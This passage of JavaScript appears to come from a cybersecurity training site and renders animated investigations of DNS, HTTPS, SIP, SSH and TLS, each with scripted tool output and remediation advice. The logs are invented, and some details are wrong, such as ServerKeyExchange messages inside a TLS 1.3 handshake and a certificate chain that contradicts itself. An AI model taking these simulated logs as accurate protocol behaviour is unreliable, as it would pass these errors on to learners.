    if (c2flag) c2flag.style.display = 'none';
    svg.querySelectorAll('*').forEach(n => n.remove());
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting dig';

    const links = [];
    for (let i = 0; i < 4; i++) {
      const y1 = 10 + i * 18, y2 = 10 + (i + 1) * 18;
      links.push(vsLink(svg, 50, y1, 50, y2, 240, { packets: 0, color: 'var(--neon)', dur: 0.9, r: 3 }));
    }

    let t = 400;
    nodes.forEach((n, i) => {
      timers.later(() => {
        n.classList.add('on');
        if (i < 4) links[i].activate();
        if (phase) phase.textContent = `// hop ${i + 1} → ${chain[i].name} — query forwarded`;
      }, t);
      t += 600;
    });
    timers.later(() => {
      if (phase) phase.textContent = '// referrals returning — answer 142.250.74.110 cached';
      links.forEach(l => l.packets(2, 'var(--neon-2)', 0.9, 3));
    }, t);
    t += 1400;
    timers.later(() => {
      nodes.forEach(n => n.classList.add('done'));
      if (phase) phase.textContent = '// lookup complete — now watching for NXDOMAIN flood';
    }, t);
    t += 800;

    // NXDOMAIN flood
    let n = 0, uniq = 0;
    const seen = new Set();
    const floodTimer = timers.every(() => {
      const sub = Math.random().toString(36).slice(2, 6) + '-random';
      if (!seen.has(sub)) { seen.add(sub); uniq++; if (kpiUniq) kpiUniq.textContent = String(uniq); }
      if (stream) {
        n += 2; // query + reply
        const ln1 = document.createElement('span'); ln1.className = 'siem-log-line warn';
        ln1.textContent = `${ts()} 192.168.1.42 → 10.0.0.53  A? ${sub}.google.com.`;
        const ln2 = document.createElement('span'); ln2.className = 'siem-log-line crit';
        ln2.textContent = `${ts()} 10.0.0.53 → 192.168.1.42  NXDOMAIN`;
        stream.appendChild(ln1); stream.appendChild(ln2);
        while (stream.children.length > 12) stream.removeChild(stream.firstChild);
      }
      if (nxdCnt) nxdCnt.textContent = String(n);
      if (kpiQps) kpiQps.textContent = String(Math.round(n / 1.5));
      if (kpiNxd) kpiNxd.textContent = String(n / 2);
      if (n >= 14) {
        if (c2flag) c2flag.style.display = 'block';
        nodes[0]?.classList.add('hit');
        if (phase) { phase.innerHTML = '// <span class="err">C2 CANDIDATE</span> — random-subdomain NXDOMAIN flood on .42'; phase.classList.add('err'); }
      }
    }, 380);
    timers.later(() => {
      phase.classList.remove('err');
      phase.textContent = '// idle — awaiting next cycle';
      if (c2flag) c2flag.style.display = 'none';
      if (stream) stream.innerHTML = '';
      nodes.forEach(n => n.classList.remove('on', 'done', 'hit'));
      if (nxdCnt) nxdCnt.textContent = '0';
      if (kpiQps) kpiQps.textContent = '0';
      if (kpiNxd) kpiNxd.textContent = '0';
      if (kpiUniq) kpiUniq.textContent = '0';
      clearInterval(floodTimer);
    }, t + 9000);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 4. HTTP/HTTPS — curl -v session + TLS handshake + mixed content ---------- */
function buildHTTPHTTPSSim(skill, meta, lvl) {
  const slug = 'http-https';
  const handshake = [
    { no: 1, name: 'ClientHello',       sub: 'TLSv1.3, SNI=api.example.com' },
    { no: 2, name: 'ServerHello',       sub: 'TLSv1.3, TLS_AES_256_GCM_SHA384' },
    { no: 3, name: 'Certificate',       sub: '3-cert chain (RSA-2048)' },
    { no: 4, name: 'ServerKeyExchange', sub: 'X25519 ECDHE' },
    { no: 5, name: 'ClientKeyExchange', sub: 'X25519 pub key' },
    { no: 6, name: 'ChangeCipherSpec',  sub: 'encrypted from now' },
    { no: 7, name: 'Finished',          sub: 'verify_data OK' }
  ];
  const visual = `
    <div class="vs-stage" id="https-stage" style="height:180px;overflow:hidden">
      <span class="vs-stage-label">// curl -v https://api.example.com/api/login — TLS 1.3 handshake</span>
      <div class="pipeline-flow" id="https-tls-flow" style="flex-wrap:wrap;gap:6px;padding:8px">
        ${handshake.map(h => `
          <div class="pl-step" id="https-tls-step-${h.no}">
            <span class="pl-no">${h.no}</span>
            <span class="pl-name">${h.name}</span>
            <span class="pl-state" style="display:block;font-size:10px">${h.sub}</span>
          </div>
        `).join('')}
      </div>
      <div class="vs-phase-line" id="https-phase">// idle — awaiting curl</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// curl -v request/response</span><span id="https-req-state">--</span></div>
        <div class="term" id="https-curl-block" style="font-size:10px;max-height:170px;overflow:auto;padding:6px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// mixed content</span><span id="https-mixed-lbl">--</span></div>
        <div class="code-viewer" id="https-mixed-out" style="font-size:10px;padding:6px">
          <div class="sim-h">GET /api/login response scan</div>
          <div id="https-mixed-line" style="color:var(--neon-3);display:none">⚠ mixed content: http://cdn.example.com/tracker.js loaded over http://</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="https-kpi-code">200</div><div class="kpi-lbl">http code</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="https-kpi-tls">1.3</div><div class="kpi-lbl">tls</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="https-kpi-mix">0</div><div class="kpi-lbl">mixed refs</div></div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ curl -v https://api.example.com/api/login`,
    '* Trying 203.0.113.42:443...',
    '* Connected to api.example.com (203.0.113.42) port 443',
    '* TLSv1.3 (OUT), TLS handshake, ClientHello (1):',
    '* TLSv1.3 (IN), TLS handshake, ServerHello (2):',
    '* TLSv1.3 (IN), TLS handshake, Certificate (11):',
    '* TLSv1.3 (IN), TLS handshake, ServerKeyExchange (12):',
    '* TLSv1.3 (OUT), TLS handshake, ClientKeyExchange (16):',
    '* TLSv1.3 (OUT), TLS change cipher, ChangeCipherSpec (1):',
    '* TLSv1.3 (IN), TLS handshake, Finished (20):',
    '* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384',
    '> GET /api/login HTTP/2',
    '> Host: api.example.com',
    '> User-Agent: curl/8.4.0',
    '> Accept: */*',
    '< HTTP/2 200 OK',
    '< server: nginx/1.25.3',
    '< content-type: application/json',
    '< strict-transport-security: max-age=31536000; includeSubDomains',
    '{"status":"ok","session":"a1b2c3d4"}',
    '[!] mixed content warning: <script src=http://cdn.example.com/tracker.js>',
    '[ok] evidence captured: /tmp/https-2025-047.log (8 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Replace http://cdn.example.com/tracker.js with https://',
    '$ #   2. Add Content-Security-Policy: upgrade-insecure-requests',
    '$ #   3. Audit all <script>/<img> src in /api/login template',
    '$ #   4. Re-test after fix — score A+ on ssllabs.com'
  ];

  function animate(host, timers) {
    const phase = host.querySelector('#https-phase');
    const tlsSteps = host.querySelectorAll('[id^="https-tls-step-"]');
    const curlBlock = host.querySelector('#https-curl-block');
    const reqState = host.querySelector('#https-req-state');
    const mixedLine = host.querySelector('#https-mixed-line');
    const mixedLbl = host.querySelector('#https-mixed-lbl');
    const kpiMix = host.querySelector('#https-kpi-mix');
    if (!phase) return;
    tlsSteps.forEach(s => s.className = 'pl-step');
    if (curlBlock) curlBlock.innerHTML = '';
    if (mixedLine) mixedLine.style.display = 'none';
    if (mixedLbl) mixedLbl.textContent = '--';
    if (kpiMix) kpiMix.textContent = '0';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting curl';

    let t = 300;
    tlsSteps.forEach((s, i) => {
      timers.later(() => {
        s.className = 'pl-step running';
        if (phase) phase.textContent = `// TLS handshake — ${handshake[i].name}`;
      }, t);
      t += 580;
      timers.later(() => { s.className = 'pl-step pass'; }, t);
    });

    if (curlBlock) {
      const curlLines = [
        '* Trying 203.0.113.42:443... * Connected',
        '> GET /api/login HTTP/2  Host: api.example.com',
        '< HTTP/2 200 OK  server: nginx/1.25.3',
        '{"status":"ok","session":"a1b2c3d4"}'
      ];
      let ci = 0;
      timers.every(() => {
        if (ci >= curlLines.length) return;
        const ln = document.createElement('div'); ln.className = 'term-line';
        ln.textContent = curlLines[ci];
        curlBlock.appendChild(ln);
        curlBlock.scrollTop = curlBlock.scrollHeight;
        ci++;
        if (reqState) reqState.textContent = ci === curlLines.length ? 'DONE' : 'streaming';
      }, 520);
    }

    timers.later(() => {
      if (mixedLine) mixedLine.style.display = 'block';
      if (mixedLbl) { mixedLbl.textContent = 'MIXED CONTENT'; mixedLbl.style.color = 'var(--neon-3)'; }
      if (kpiMix) kpiMix.textContent = '1';
      if (phase) { phase.innerHTML = '// <span class="err">MIXED CONTENT</span> — http://cdn.example.com/tracker.js in 200 OK response'; phase.classList.add('err'); }
    }, t + 400);
    timers.later(() => { phase.classList.remove('err'); phase.textContent = '// idle — awaiting next cycle'; }, t + 3400);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 5. SIP/RTP — registration + INVITE + 403 nonce mismatch ---------- */
function buildSIPRTPSim(skill, meta, lvl) {
  const slug = 'sip-rtp';
  const visual = `
    <div class="vs-stage" id="sip-stage" style="height:240px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// SIP registration + INVITE + 403 failure — VoIP diagnostic</span>
      <div class="vs-node" id="sip-ua" style="left:8%;top:20%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">📞</span><span class="vs-node-title">UA (alice)</span>
        <span class="vs-node-sub">1001@pbx.local</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="sip-pbx" style="left:60%;top:20%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">📞</span><span class="vs-node-title">SIP PBX</span>
        <span class="vs-node-sub">10.0.0.50:5060</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="sip-bob" style="left:8%;top:65%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">📞</span><span class="vs-node-title">UA (bob)</span>
        <span class="vs-node-sub">1002@pbx.local</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="sip-rtp-relay" style="left:60%;top:65%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">📡</span><span class="vs-node-title">RTP RELAY</span>
        <span class="vs-node-sub">udp 10000-10100</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="sip-phase">// idle — awaiting REGISTER</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// sngrep packet capture</span><span id="sip-pkt-cnt">0</span></div>
        <div class="siem-log-stream" id="sip-pkt-stream" style="font-size:10px;max-height:150px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// auth check</span><span>nonce</span></div>
        <div class="code-viewer" style="font-size:10px;padding:6px">
          <div class="sim-h">403 Forbidden — auth nonce mismatch</div>
          <div class="sim-p">nonce issued by server ≠ nonce sent by client</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="sip-kpi-reg">0</div><div class="kpi-lbl">registers</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="sip-kpi-inv">0</div><div class="kpi-lbl">invites</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="sip-kpi-403">0</div><div class="kpi-lbl">403s</div></div>
          </div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ sipsak -v -s sip:1001@pbx.local`,
    'REGISTER sip:pbx.local SIP/2.0',
    'From: <sip:1001@pbx.local>;tag=abc123',
    'Contact: <sip:1001@192.168.1.42:5060>',
    'SIP/2.0 401 Unauthorized — auth challenge',
    'WWW-Authenticate: Digest realm="pbx.local", nonce="7f8e9d0c", algorithm=MD5',
    'REGISTER sip:pbx.local SIP/2.0  (with Authorization header)',
    'SIP/2.0 200 OK — registered, expires=3600',
    '[+] INVITE sip:1002@pbx.local SIP/2.0',
    '  From: <sip:1001@pbx.local>;tag=abc123',
    '  To: <sip:1002@pbx.local>',
    '  SDP: RTP/AVP 0 8 101 (PCMU, PCMA, DTMF)',
    'SIP/2.0 100 Trying',
    'SIP/2.0 180 Ringing',
    'SIP/2.0 200 OK — Session Description in body',
    'ACK sip:1002@192.168.1.51:5060 SIP/2.0',
    '[+] RTP streams flowing — 64 kbps G.711u',
    '[!] 403 Forbidden — auth nonce mismatch',
    'SIP/2.0 403 Forbidden — Authorization nonce 9a2b ≠ 7f8e9d0c',
    '[ok] evidence captured: /tmp/sip-2025-047.pcap (1.4 MB)',
    '$ # Recommended remediation:',
    '$ #   1. Re-sync auth nonce cache on PBX — timing skew detected',
    '$ #   2. Validate SIP digest password for extension 1001',
    '$ #   3. Enable SRTP + ZRTP for media plane',
    '$ #   4. Block port 5060 from internet — only via SBC'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#sip-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 240);
    const ua = host.querySelector('#sip-ua');
    const pbx = host.querySelector('#sip-pbx');
    const bob = host.querySelector('#sip-bob');
    const rtp = host.querySelector('#sip-rtp-relay');
    const phase = host.querySelector('#sip-phase');
    const stream = host.querySelector('#sip-pkt-stream');
    const pktCnt = host.querySelector('#sip-pkt-cnt');
    const kpiReg = host.querySelector('#sip-kpi-reg');
    const kpiInv = host.querySelector('#sip-kpi-inv');
    const kpi403 = host.querySelector('#sip-kpi-403');
    // reset
    svg.querySelectorAll('*').forEach(n => n.remove());
    [ua, pbx, bob, rtp].forEach(n => n?.classList.remove('on', 'done', 'hit'));
    if (stream) stream.innerHTML = '';
    if (pktCnt) pktCnt.textContent = '0';
    if (kpiReg) kpiReg.textContent = '0';
    if (kpiInv) kpiInv.textContent = '0';
    if (kpi403) kpi403.textContent = '0';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting REGISTER';

    const uaPbx = vsLink(svg, 8, 20, 60, 20, 240, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });
    const bobPbx = vsLink(svg, 8, 65, 60, 20, 240, { packets: 0, color: 'var(--neon-2)', dur: 1.0, r: 3, pts: [[35, 65], [35, 20]] });
    const uaRtp = vsLink(svg, 8, 20, 60, 65, 240, { packets: 0, color: 'var(--neon-3)', dur: 1.0, r: 3, pts: [[35, 50]], hidden: true });
    const bobRtp = vsLink(svg, 8, 65, 60, 65, 240, { packets: 0, color: 'var(--neon-3)', dur: 1.0, r: 3, hidden: true });

    let n = 0;
    const addPkt = (label, cls) => {
      if (stream) {
        n++;
        const ln = document.createElement('span');
        ln.className = 'siem-log-line ' + cls;
        ln.textContent = `${ts()} ${label}`;
        stream.appendChild(ln);
        while (stream.children.length > 10) stream.removeChild(stream.firstChild);
      }
      if (pktCnt) pktCnt.textContent = String(n);
    };

    let t = 400;
    timers.later(() => { ua?.classList.add('on'); pbx?.classList.add('on'); uaPbx.packets(2, 'var(--neon)', 1.0, 3); phase.textContent = '// REGISTER → 401 Unauthorized'; addPkt('REGISTER 1001@pbx.local  SIP/2.0', 'info'); }, t); t += 800;
    timers.later(() => { uaPbx.packets(2, 'var(--neon-2)', 1.0, 3); addPkt('SIP/2.0 401 Unauthorized — Digest challenge', 'warn'); }, t); t += 800;
    timers.later(() => { uaPbx.packets(2, 'var(--neon)', 1.0, 3); addPkt('REGISTER+Authorization header → pbx.local', 'info'); }, t); t += 800;
    timers.later(() => { uaPbx.packets(2, 'var(--neon-2)', 1.0, 3); addPkt('SIP/2.0 200 OK — registered expires=3600', 'ok'); if (kpiReg) kpiReg.textContent = '1'; }, t); t += 1000;
    timers.later(() => { bob?.classList.add('on'); bobPbx.on(); bobPbx.packets(2, 'var(--neon-2)', 1.0, 3); phase.textContent = '// INVITE → 100/180/200/ACK'; addPkt('INVITE sip:1002@pbx.local SIP/2.0', 'info'); if (kpiInv) kpiInv.textContent = '1'; }, t); t += 800;
    timers.later(() => { bobPbx.packets(2, 'var(--neon)', 1.0, 3); addPkt('SIP/2.0 100 Trying', 'ok'); }, t); t += 700;
    timers.later(() => { bobPbx.packets(2, 'var(--neon)', 1.0, 3); addPkt('SIP/2.0 180 Ringing', 'ok'); }, t); t += 800;
    timers.later(() => { bobPbx.packets(2, 'var(--neon-2)', 1.0, 3); addPkt('SIP/2.0 200 OK — SDP RTP/AVP', 'ok'); }, t); t += 600;
    timers.later(() => { bobPbx.packets(2, 'var(--neon)', 1.0, 3); addPkt('ACK sip:1002@192.168.1.51:5060', 'ok'); }, t); t += 600;
    timers.later(() => { uaRtp.on(); bobRtp.on(); uaRtp.packets(3, 'var(--neon-3)', 1.4, 3.5); bobRtp.packets(3, 'var(--neon-3)', 1.4, 3.5); rtp?.classList.add('on'); phase.textContent = '// RTP media flowing — G.711u @ 64 kbps'; addPkt('RTP 192.168.1.42:10000 → 10.0.0.50:10000 (G.711u)', 'ok'); }, t); t += 1800;
    timers.later(() => { ua?.classList.add('hit'); phase.innerHTML = '// <span class="err">403 FORBIDDEN</span> — auth nonce mismatch'; phase.classList.add('err'); uaPbx.packets(2, 'var(--neon-3)', 1.0, 3); addPkt('SIP/2.0 403 Forbidden — nonce 9a2b ≠ 7f8e9d0c', 'crit'); if (kpi403) kpi403.textContent = '1'; }, t); t += 2000;
    timers.later(() => { phase.classList.remove('err'); phase.textContent = '// idle — awaiting next cycle'; }, t);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 6. SSH — session + 6-step KEX/cipher/auth + sshd_config weak-cipher audit ---------- */
function buildSSHSim(skill, meta, lvl) {
  const slug = 'ssh';
  const visual = `
    <div class="vs-stage" id="ssh-stage" style="height:160px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// ssh -i ~/.ssh/id_ed25519 admin@192.168.1.1 — banner + KEX</span>
      <div class="vs-node" id="ssh-client" style="left:8%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">💻</span><span class="vs-node-title">CLIENT</span>
        <span class="vs-node-sub">kali 5.15</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="ssh-gw" style="left:80%;top:50%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🔐</span><span class="vs-node-title">GATEWAY</span>
        <span class="vs-node-sub">192.168.1.1:22</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="ssh-phase">// idle — awaiting ssh</div>
    </div>
    <div class="vs-steps" id="ssh-steps">
      <div class="vs-step pending"><span class="vs-step-ico">1️⃣</span><span class="vs-step-body"><b>TCP connect</b> — 192.168.1.1:22</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">2️⃣</span><span class="vs-step-body"><b>Banner</b> — SSH-2.0-OpenSSH_8.4p1 Debian-5</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">3️⃣</span><span class="vs-step-body"><b>Key exchange</b> — curve25519-sha256</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">4️⃣</span><span class="vs-step-body"><b>Cipher</b> — chacha20-poly1305@openssh.com</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">5️⃣</span><span class="vs-step-body"><b>Auth</b> — ed25519 publickey accepted</span><span class="vs-step-state">QUEUED</span></div>
      <div class="vs-step pending"><span class="vs-step-ico">6️⃣</span><span class="vs-step-body"><b>Config audit</b> — /etc/ssh/sshd_config</span><span class="vs-step-state">QUEUED</span></div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// ssh session</span><span id="ssh-sess-state">--</span></div>
        <div class="term" id="ssh-term" style="font-size:10px;max-height:130px;overflow:auto;padding:6px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// weak cipher check</span><span id="ssh-cipher-lbl">--</span></div>
        <div class="code-viewer" id="ssh-config-out" style="font-size:10px;padding:6px">
          <div class="sim-h">/etc/ssh/sshd_config (excerpt)</div>
          <div>PermitRootLogin prohibit-password</div>
          <div>PasswordAuthentication no</div>
          <div>PubkeyAuthentication yes</div>
          <div id="ssh-cfg-line-arc" style="color:var(--neon-3);display:none">Ciphers arcfour256,arcfour — DEPRECATED</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ ssh -i ~/.ssh/id_ed25519 -v admin@192.168.1.1`,
    'OpenSSH_9.0p1, OpenSSL 3.0.9',
    'debug1: Connecting to 192.168.1.1 [192.168.1.1] port 22.',
    'debug1: Connection established.',
    'debug1: Local version string: SSH-2.0-OpenSSH_9.0',
    'debug1: Remote protocol version 2.0, remote software version OpenSSH_8.4p1 Debian-5',
    'debug1: kex: algorithm: curve25519-sha256',
    'debug1: kex: host key algorithm: ssh-ed25519',
    'debug1: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit>',
    'debug1: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit>',
    'debug1: Server accepts key: ssh-ed25519 SHA256:abc123',
    'debug1: Authentication succeeded (publickey).',
    '$ sudo grep -Ei "^(ciphers|macs|kexalgorithms|permitroot|passwordauth)" /etc/ssh/sshd_config',
    'PermitRootLogin prohibit-password',
    'PasswordAuthentication no',
    'PubkeyAuthentication yes',
    '[!] Ciphers arcfour256,arcfour  ← DEPRECATED (RC4, broken since 2013)',
    '[!] KexAlgorithms diffie-hellman-group1-sha1  ← DEPRECATED',
    '[ok] evidence captured: /tmp/ssh-2025-047.log (4 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Remove arcfour* and 3des-cbc from Ciphers line',
    '$ #   2. Remove diffie-hellman-group1-sha1 from KexAlgorithms',
    '$ #   3. Set Ciphers to: chacha20-poly1305@openssh.com,aes256-gcm@openssh.com',
    '$ #   4. Set MACs to: hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm',
    '$ #   5. systemctl restart sshd; re-scan with ssh-audit'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#ssh-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 160);
    const cli = host.querySelector('#ssh-client');
    const gw = host.querySelector('#ssh-gw');
    const phase = host.querySelector('#ssh-phase');
    const stepsList = host.querySelector('#ssh-steps');
    const term = host.querySelector('#ssh-term');
    const sessState = host.querySelector('#ssh-sess-state');
    const cipherLbl = host.querySelector('#ssh-cipher-lbl');
    const cfgArc = host.querySelector('#ssh-cfg-line-arc');
    // reset
    if (term) term.innerHTML = '';
    if (sessState) sessState.textContent = '--';
    if (cipherLbl) cipherLbl.textContent = '--';
    if (cfgArc) cfgArc.style.display = 'none';
    svg.querySelectorAll('*').forEach(n => n.remove());
    cli?.classList.remove('on', 'done', 'hit');
    gw?.classList.remove('on', 'done', 'hit');
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting ssh';

    const link = vsLink(svg, 8, 50, 80, 50, 160, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });

    const termLines = [
      '$ ssh -i ~/.ssh/id_ed25519 -v admin@192.168.1.1',
      'debug1: kex: curve25519-sha256, host key: ssh-ed25519',
      'debug1: cipher: chacha20-poly1305@openssh.com (both dirs)',
      'debug1: Auth succeeded (publickey)',
      '$ sudo grep -Ei "^(ciphers|...)" /etc/ssh/sshd_config',
      '[!] Ciphers arcfour256,arcfour  ← DEPRECATED'
    ];
    const phases = [
      { dur: 800, run() { cli?.classList.add('on'); link.activate(); phase.textContent = '// TCP connect — 192.168.1.1:22'; if (sessState) sessState.textContent = 'connecting'; }, end() {} },
      { dur: 700, run() { gw?.classList.add('on'); link.packets(2, 'var(--neon)', 0.9, 3); phase.textContent = '// banner — SSH-2.0-OpenSSH_8.4p1'; if (sessState) sessState.textContent = 'banner'; }, end() {} },
      { dur: 700, run() { link.packets(2, 'var(--neon-2)', 0.9, 3); phase.textContent = '// KEX — curve25519-sha256'; if (sessState) sessState.textContent = 'kex'; }, end() {} },
      { dur: 700, run() { link.packets(2, 'var(--neon)', 0.9, 3); phase.textContent = '// cipher — chacha20-poly1305@openssh.com'; if (sessState) sessState.textContent = 'cipher'; }, end() {} },
      { dur: 700, run() { link.packets(2, 'var(--neon-2)', 0.9, 3); phase.textContent = '// ed25519 publickey accepted'; if (sessState) sessState.textContent = 'auth'; }, end() {} },
      { dur: 1300, run() {
          link.packets(2, 'var(--neon-3)', 0.9, 3);
          if (cfgArc) cfgArc.style.display = 'block';
          if (cipherLbl) { cipherLbl.textContent = 'WEAK CIPHER FOUND'; cipherLbl.style.color = 'var(--neon-3)'; }
          phase.innerHTML = '// <span class="err">ANOMALY</span> — arcfour256 / arcfour in sshd_config (deprecated RC4)';
          phase.classList.add('err');
          gw?.classList.add('hit');
        }, end() {
          phase.classList.remove('err');
          phase.textContent = '// audit complete — finding logged';
        }
      }
    ];
    const total = vsRunSteps(stepsList, timers, phases);
    timers.later(() => { phase.textContent = '// idle — awaiting next cycle'; }, total + 1500);

    if (term) {
      let ti = 0;
      timers.every(() => {
        if (ti >= termLines.length) return;
        const ln = document.createElement('div'); ln.className = 'term-line';
        ln.textContent = termLines[ti];
        if (termLines[ti].includes('DEPRECATED')) ln.classList.add('term-err');
        else if (termLines[ti].startsWith('$')) ln.classList.add('term-prompt');
        term.appendChild(ln); term.scrollTop = term.scrollHeight;
        ti++;
      }, 700);
    }
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 7. TLS — openssl s_client + 3-cert chain + deprecated TLSv1.0 ---------- */
function buildTLSSim(skill, meta, lvl) {
  const slug = 'tls';
  const certMeta = [
    { no: 1, subj: 'CN=google.com',         issuer: 'O=Google Trust Services LLC',  exp: '2025-09-30' },
    { no: 2, subj: 'CN=GTS CA 1C3',         issuer: 'O=Google Trust Services',      exp: '2027-09-13' },
    { no: 3, subj: 'CN=GlobalSign Root CA', issuer: 'O=GlobalSign, self-signed',     exp: '2028-01-28' }
  ];
  const visual = `
    <div class="vs-stage" id="tls-stage" style="height:200px;overflow:hidden">
      <span class="vs-stage-label">// openssl s_client -connect google.com:443 — TLS 1.3</span>
      <div class="forensics-chain" id="tls-cert-chain" style="padding:8px;flex-wrap:wrap;gap:6px;justify-content:center">
        ${certMeta.map((c, i) => `
          <div class="fc-node" id="tls-cert-${c.no}">
            <span class="fc-ico">📄</span>
            <span class="fc-name">${c.subj}</span>
            <span class="fc-sub">issuer: ${c.issuer} · ${c.exp}</span>
          </div>
          ${i < certMeta.length - 1 ? '<div class="fc-arrow">→</div>' : ''}
        `).join('')}
      </div>
      <div class="vs-phase-line" id="tls-phase">// idle — awaiting s_client</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// negotiated cipher</span><span id="tls-cipher-lbl">--</span></div>
        <div class="code-viewer" style="font-size:10px;padding:6px">
          <div class="sim-h">ServerHello</div>
          <div>Cipher: <span id="tls-cipher-name">--</span></div>
          <div>Version: <span id="tls-version">--</span></div>
          <div>Session ticket: <span id="tls-ticket">--</span></div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="tls-kpi-cert">0</div><div class="kpi-lbl">certs</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="tls-kpi-dep">0</div><div class="kpi-lbl">deprecated</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="tls-kpi-score">--</div><div class="kpi-lbl">grade</div></div>
          </div>
        </div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// deprecated TLS check</span><span id="tls-dep-lbl">--</span></div>
        <div class="code-viewer" style="font-size:10px;padding:6px">
          <div class="sim-h">Per-protocol offer</div>
          <div id="tls-proto-13" style="color:var(--neon-2)">TLSv1.3   offered ✓</div>
          <div id="tls-proto-12" style="color:var(--neon-2)">TLSv1.2   offered ✓</div>
          <div id="tls-proto-11" style="color:var(--neon-3);display:none">TLSv1.1   still offered ✗ DEPRECATED</div>
          <div id="tls-proto-10" style="color:var(--neon-3);display:none">TLSv1.0   still offered ✗ DEPRECATED</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ openssl s_client -connect google.com:443 -tls1_3`,
    'CONNECTED(00000003)',
    'depth=2 CN = GlobalSign Root CA',
    '   verify return:1',
    'depth=1 O = Google Trust Services LLC, CN = GTS CA 1C3',
    '   verify return:1',
    'depth=0 CN = google.com',
    '   verify return:1',
    '---',
    'Certificate chain',
    ' 0 s:CN = google.com',
    '   i:O = Google Trust Services LLC, CN = GTS CA 1C3',
    ' 1 s:O = Google Trust Services LLC, CN = GTS CA 1C3',
    '   i:O = Google Trust Services, CN = GTS Root R1',
    ' 2 s:O = Google Trust Services, CN = GTS Root R1',
    '   i:O = GlobalSign, CN = GlobalSign Root CA',
    '---',
    'Server certificate',
    'subject=CN = google.com',
    'issuer=O = Google Trust Services LLC, CN = GTS CA 1C3',
    '---',
    'SSL handshake has read 4096 bytes',
    'New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384',
    'Server public key is 2048 bit',
    'TLS session ticket (lifetime 7200s):',
    ' 04a3...8b21 (160 octets)',
    '[!] TLSv1.0 still offered — DEPRECATED (RFC 8996)',
    '[ok] evidence captured: /tmp/tls-2025-047.log (6 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Disable TLSv1.0 and TLSv1.1 at the load balancer',
    '$ #   2. nginx: ssl_protocols TLSv1.2 TLSv1.3;',
    '$ #   3. Remove legacy cipher suites (RC4, 3DES, CBC-MAC)',
    '$ #   4. Re-scan with testssl.sh / ssllabs.com → target A+'
  ];

  function animate(host, timers) {
    const certs = host.querySelectorAll('[id^="tls-cert-"]');
    const phase = host.querySelector('#tls-phase');
    const cipherLbl = host.querySelector('#tls-cipher-lbl');
